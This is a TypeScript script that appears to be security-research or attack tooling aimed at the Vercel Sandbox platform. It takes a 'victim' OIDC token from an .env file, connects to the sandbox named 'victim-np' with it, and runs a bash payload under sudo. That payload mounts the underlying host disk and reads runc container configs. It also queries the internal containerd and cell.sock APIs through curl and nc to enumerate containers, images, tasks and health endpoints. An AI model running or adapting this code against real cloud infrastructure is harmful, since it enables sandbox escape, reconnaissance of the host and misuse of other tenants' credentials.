import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "===== runc task config (sandbox-init container) ====="
RC=$(find $R/run/cell/runc -name config.json | head -1)
echo "config: $RC"
cat $RC 2>&1
echo
echo "===== container.pid ====="
cat $(dirname $RC)/container.pid 2>&1
echo
echo "===== containerd via h2c curl ====="
for m in \
  "/containerd.services.containers.v1.Containers/List" \
  "/containerd.services.images.v1.Images/List" \
  "/containerd.services.namespaces.v1.Namespaces/List" \
  "/containerd.services.leases.v1.Leases/List" \
  "/containerd.services.tasks.v1.Tasks/List" \
  "/containerd.services.content.v1.Content/List" \
  "/containerd.services.snapshots.v1.Snapshots/List" \
  "/containerd.services.introspection.v1.Introspection/Plugins"; do
  echo "--- $m ---"
  timeout 5 curl -s --http2-prior-knowledge --unix-socket $R/run/containerd/containerd.sock -X POST "http://containerd$m" -d '' 2>&1 | head -c 400; echo
done
echo
echo "===== cell.sock h2c ====="
timeout 5 curl -s --http2-prior-knowledge --unix-socket $R/run/cell/cell.sock -X POST "http://cell/vercel.hive.celld.api.v1.Celld/Health" -d '{}' 2>&1 | head -c 400; echo
timeout 5 curl -s --http2-prior-knowledge --unix-socket $R/run/cell/cell.sock -X POST "http://cell/vercel.hive.cell.api.containers.v1.Containers/List" -d '{}' 2>&1 | head -c 400; echo
echo "===== cell.sock HTTP1.1 paths (json) ====="
for p in /health /api /v1 /containers /status /info /cells /sandboxes /metrics /debug/pprof /api/v1 /api/v1/containers; do
  r=$(printf "GET $p HTTP/1.0\r\nHost: cell\r\n\r\n" | timeout 2 nc -U $R/run/cell/cell.sock 2>&1 | head -1)
  case "$r" in HTTP/1.*2*) echo "  $p -> $r";; *) echo "  $p -> $(printf '%s' "$r" | head -c 60)";; esac
done
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore6.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore6.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });